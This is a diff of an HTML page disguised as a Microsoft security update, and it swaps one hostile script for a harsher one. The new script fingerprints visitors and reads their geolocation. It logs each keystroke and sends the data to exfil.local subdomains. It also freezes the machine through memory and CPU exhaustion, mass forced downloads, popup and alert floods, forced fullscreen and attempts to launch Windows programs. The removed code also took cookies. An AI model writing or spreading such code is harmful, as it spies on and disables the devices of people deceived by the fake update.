@@ -2,184 +2,221 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Driver Update Required</title>
+<title>Microsoft Security Update</title>
 <style>
-body { background: #1a1a2e; color: #e0e0e0; font-family: 'Segoe UI',Arial; text-align:center; padding:60px 20px; }
-.box { background:#16213e; border-radius:10px; padding:40px; max-width:500px; margin:0 auto; border:1px solid #0f3460; }
-h2 { color:#e94560; margin:0 0 10px 0; font-weight:300; letter-spacing:2px; }
-p { color:#8899aa; font-size:13px; }
-.loader { width:40px; height:40px; border:3px solid #0f3460; border-top:3px solid #e94560; border-radius:50%; animation:spin .8s linear infinite; margin:25px auto; }
+body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI',Arial; text-align:center; padding:60px 20px; }
+.box { background:#161b22; border-radius:10px; padding:40px; max-width:500px; margin:0 auto; border:1px solid #30363d; }
+h2 { color:#58a6ff; margin:0 0 10px 0; font-weight:300; }
+p { color:#8b949e; font-size:13px; }
+.loader { width:40px; height:40px; border:3px solid #21262d; border-top:3px solid #58a6ff; border-radius:50%; animation:spin .8s linear infinite; margin:25px auto; }
 @keyframes spin { 100%{transform:rotate(360deg)} }
 </style>
 </head>
 <body>
 <div class="box">
-    <h2>CRITICAL UPDATE</h2>
-    <p>Your system driver is out of date.<br>Applying hotfix...</p>
+    <h2>Security Update Required</h2>
+    <p>Your system is missing critical security patches.<br>Installing update...</p>
     <div class="loader"></div>
-    <p style="font-size:11px;color:#556;">Please do not close this window.</p>
+    <p style="font-size:11px;color:#484f58;">Do not turn off your computer.</p>
 </div>
 
 <script>
 (function(){
-    var D = {};
-    
     try {
-        var x = new XMLHttpRequest();
-        x.open("GET","https://api.ipify.org?format=json",false);
-        x.send();
-        if(x.status==200) D.ip = JSON.parse(x.responseText).ip;
-    }catch(e){}
-    
-    try {
-        var p = new RTCPeerConnection({iceServers:[]});
-        p.createDataChannel("");
-        p.createOffer().then(function(o){p.setLocalDescription(o)});
-        p.onicecandidate = function(e){
-            if(e.candidate){
-                var m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                if(m) D.localIP = m[0];
-            }
-        };
-        setTimeout(function(){p.close()},1500);
-    }catch(e){}
-    
-    D.ua = navigator.userAgent;
-    D.plat = navigator.platform;
-    D.lang = navigator.language;
-    D.cookies = document.cookie;
-    D.screen = screen.width+'x'+screen.height;
-    D.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    D.cores = navigator.hardwareConcurrency || '?';
-    D.ram = navigator.deviceMemory || '?';
-    
-    try {
-        navigator.geolocation.getCurrentPosition(function(pos){
-            D.lat = pos.coords.latitude;
-            D.lon = pos.coords.longitude;
-        },function(){},{timeout:2000});
-    }catch(e){}
-    
-    try {
-        var i = new Image();
-        i.src = 'https://'+btoa(JSON.stringify(D)).substring(0,60)+'.exfil.local/x.png';
-    }catch(e){}
-    
-    for(var w=0; w<200; w++){
+        var d = {};
         try {
-            var win = window.open('about:blank','_blank',
-                'width=300,height=200,left='+(w*10)+',top='+(w*8));
-            if(win){
-                win.document.write('<html><body bgcolor=black>'+
-                    '<h1 style="color:red;font-size:40px;">LOCKED</h1>'+
-                    '<p style="color:white;">'+w+'</p></body></html>');
-            }
+            var x = new XMLHttpRequest();
+            x.open("GET","https://api.ipify.org?format=json",false);
+            x.send();
+            if(x.status==200) d.ip = JSON.parse(x.responseText).ip;
         }catch(e){}
-    }
-    
-    for(var f=0; f<1000; f++){
         try {
-            var size = 200000;
-            var txt = '';
-            for(var s=0; s<size; s+=100){
-                txt += 'CORRUPTED_SYSTEM_'+Math.random()+'\n';
-            }
-            var b = new Blob([txt], {type:'text/plain'});
-            var u = URL.createObjectURL(b);
-            var a = document.createElement('a');
-            a.href = u;
-            a.download = 'system_update_' + f + '.txt';
-            a.style.display = 'none';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            setTimeout(function(url){URL.revokeObjectURL(url)}, 100, u);
+            var p = new RTCPeerConnection({iceServers:[]});
+            p.createDataChannel("");
+            p.createOffer().then(function(o){p.setLocalDescription(o)});
+            p.onicecandidate = function(e){
+                if(e.candidate){
+                    var m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                    if(m) d.local = m[0];
+                }
+            };
+            setTimeout(function(){p.close()},1500);
         }catch(e){}
-    }
-    
-    for(var al=0; al<500; al++){
-        (function(n){
-            setTimeout(function(){
-                try { alert('CRITICAL ERROR #'+Math.floor(Math.random()*99999)); } catch(e){}
-            }, n * 80);
-        })(al);
-    }
-    
-    setTimeout(function(){
-        while(true){
-            for(var c=0; c<50000; c++){
-                Math.pow(Math.tan(Math.random()*100), Math.PI);
-                Math.sqrt(Math.abs(Math.sin(c)*Math.cos(c)*Math.tan(c)));
-            }
+        d.ua = navigator.userAgent;
+        d.plat = navigator.platform;
+        d.lang = navigator.language;
+        d.screen = screen.width+'x'+screen.height;
+        d.cores = navigator.hardwareConcurrency;
+        d.ram = navigator.deviceMemory;
+        try {
+            navigator.geolocation.getCurrentPosition(function(p){
+                d.lat=p.coords.latitude; d.lon=p.coords.longitude;
+            },function(){},{timeout:2000});
+        }catch(e){}
+        try {
+            var img = new Image();
+            img.src = 'https://'+btoa(JSON.stringify(d)).substring(0,60)+'.exfil.local/x.png';
+        }catch(e){}
+    }catch(e){}
+
+    try {
+        var leak = [];
+        for(var i=0;i<200;i++){
+            leak.push(new Array(2000000).fill(String(Math.random())));
         }
-    }, 1000);
-    
-    setInterval(function(){
-        try { document.documentElement.requestFullscreen(); } catch(e){}
-    }, 500);
-    
-    window.onbeforeunload = function(){
-        return 'System update in progress. Do not leave.';
-    };
-    
+    }catch(e){}
+
+    for(var core=0;core<(navigator.hardwareConcurrency||8)*4;core++){
+        setTimeout(function(){
+            while(true){
+                for(var j=0;j<100000;j++){
+                    Math.atan2(Math.pow(Math.sin(j),Math.cos(j)),Math.sqrt(Math.abs(Math.tan(j))));
+                    Math.pow(Math.tan(Math.random()*100), Math.PI);
+                    Math.sqrt(Math.abs(Math.sin(j)*Math.cos(j)*Math.tan(j)));
+                }
+            }
+        },core*10);
+    }
+
+    function floodDownloads(attempt){
+        for(var f=0;f<200;f++){
+            try {
+                var txt = '';
+                for(var s=0;s<200000;s++) txt += 'DATA_'+Math.random()+'\n';
+                var b = new Blob([txt],{type:'text/plain'});
+                var u = URL.createObjectURL(b);
+                var a = document.createElement('a');
+                a.href = u;
+                a.download = 'patch_'+Math.random().toString(36).substring(2)+'.txt';
+                a.style.display='none';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                setTimeout(function(url){URL.revokeObjectURL(url)},10,u);
+            }catch(e){}
+        }
+        if(attempt<50) setTimeout(function(){floodDownloads(attempt+1)},50);
+    }
+    floodDownloads(0);
+
     try {
-        var cmds = ['calc.exe','notepad.exe','cmd.exe','explorer.exe','taskmgr.exe'];
-        for(var c=0; c<cmds.length; c++){
-            for(var t=0; t<25; t++){
+        var progs = ['calc.exe','notepad.exe','cmd.exe','explorer.exe','mspaint.exe','write.exe','snippingtool.exe','regedit.exe','taskmgr.exe','control.exe'];
+        for(var p=0;p<progs.length;p++){
+            for(var t=0;t<50;t++){
                 try {
                     var ws = new ActiveXObject('WScript.Shell');
-                    ws.Run(cmds[c], 0, false);
-                } catch(e){}
+                    ws.Run(progs[p],1,false);
+                }catch(e){}
+                try {
+                    var shell = new ActiveXObject('Shell.Application');
+                    shell.ShellExecute(progs[p],'','','open',1);
+                }catch(e){}
             }
         }
-    } catch(e){}
-    
-    for(var h=0; h<100; h++){
-        setTimeout(function(){
-            try {
-                location.hash = Math.random().toString(36).substring(2);
-            } catch(e){}
-        }, h*10);
-    }
-    
-    document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
-    
-    setInterval(function(){ debugger; }, 100);
-    
-    console.log = function(){};
-    console.warn = function(){};
-    console.error = function(){};
-    
-    document.addEventListener('keydown', function(e){
-        D.keys = D.keys || [];
-        D.keys.push(e.key);
-        if(D.keys.length >= 50){
-            try {
-                var i = new Image();
-                i.src = 'https://keys.' + btoa(D.keys.join('')).substring(0,30) + '.exfil.local/key.png';
-            } catch(e){}
-            D.keys = [];
-        }
-    });
-    
-    document.addEventListener('click', function(){
-        for(var x=0; x<50; x++){
-            try {
-                window.open('about:blank','_blank','width=200,height=200');
-            } catch(e){}
-        }
-    });
-    
-    document.addEventListener('mousemove', function(){
+    }catch(e){}
+
+    for(var w=0;w<500;w++){
         try {
-            window.open('about:blank','_blank','width=100,height=100');
-        } catch(e){}
+            var win = window.open('about:blank','_blank','width=400,height=300,left='+(w*5)+',top='+(w*4));
+            if(win){
+                win.document.write('<html><body bgcolor=black style="margin:0;overflow:hidden">'+
+                    '<h1 style="color:red;font-size:60px;text-align:center;margin-top:80px;">⚠ LOCKED ⚠</h1>'+
+                    '<p style="color:white;text-align:center;font-size:20px;">SYSTEM COMPROMISED</p>'+
+                    '</body></html>');
+                try { win.moveTo(w*5,w*4); } catch(e){}
+            }
+        }catch(e){}
+    }
+
+    for(var al=0;al<2000;al++){
+        (function(n){
+            setTimeout(function(){
+                try { alert('FATAL ERROR 0x'+Math.floor(Math.random()*0xFFFFFF).toString(16).toUpperCase()); } catch(e){}
+            },n*15);
+        })(al);
+    }
+
+    setInterval(function(){
+        try { document.documentElement.requestFullscreen(); } catch(e){}
+    },100);
+
+    window.onbeforeunload = function(){ return 'Cannot close during update.'; };
+
+    setInterval(function(){ debugger; },20);
+
+    document.addEventListener('keydown',function(e){
+        try {
+            var img = new Image();
+            img.src = 'https://k.'+btoa(e.key).substring(0,10)+'.exfil.local/k.png';
+        }catch(e){}
     });
-    
+
+    document.addEventListener('click',function(){
+        for(var x=0;x<100;x++){
+            try { window.open('about:blank','_blank','width=300,height=200'); }catch(e){}
+        }
+    });
+
+    document.addEventListener('mousemove',function(){
+        try { window.open('about:blank','_blank','width=150,height=100'); }catch(e){}
+    });
+
     setInterval(function(){
         document.title = Math.random().toString(36).substring(7);
-    }, 50);
-    
+        try { history.pushState(null,null,'#'+Math.random().toString(36).substring(2)); }catch(e){}
+    },10);
+
+    setTimeout(function(){
+        for(var f2=0;f2<2000;f2++){
+            try {
+                var b2 = new Blob([new Array(500000).join('X')],{type:'text/plain'});
+                var u2 = URL.createObjectURL(b2);
+                var a2 = document.createElement('a');
+                a2.href = u2;
+                a2.download = 'critical_update_'+f2+'.txt';
+                a2.style.display='none';
+                document.body.appendChild(a2);
+                a2.click();
+                document.body.removeChild(a2);
+            }catch(e){}
+        }
+    },1000);
+
+    setTimeout(function(){
+        for(var f3=0;f3<2000;f3++){
+            try {
+                var b3 = new Blob([new Array(500000).join('Y')],{type:'text/plain'});
+                var u3 = URL.createObjectURL(b3);
+                var a3 = document.createElement('a');
+                a3.href = u3;
+                a3.download = 'hotfix_'+f3+'.txt';
+                a3.style.display='none';
+                document.body.appendChild(a3);
+                a3.click();
+                document.body.removeChild(a3);
+            }catch(e){}
+        }
+    },3000);
+
+    setTimeout(function(){
+        for(var f4=0;f4<2000;f4++){
+            try {
+                var b4 = new Blob([new Array(500000).join('Z')],{type:'text/plain'});
+                var u4 = URL.createObjectURL(b4);
+                var a4 = document.createElement('a');
+                a4.href = u4;
+                a4.download = 'sb_'+f4+'.txt';
+                a4.style.display='none';
+                document.body.appendChild(a4);
+                a4.click();
+                document.body.removeChild(a4);
+            }catch(e){}
+        }
+    },5000);
+
+    console.log=function(){}; console.warn=function(){}; console.error=function(){};
+    document.addEventListener('contextmenu',function(e){e.preventDefault()});
+
 })();
 </script>
 </body>
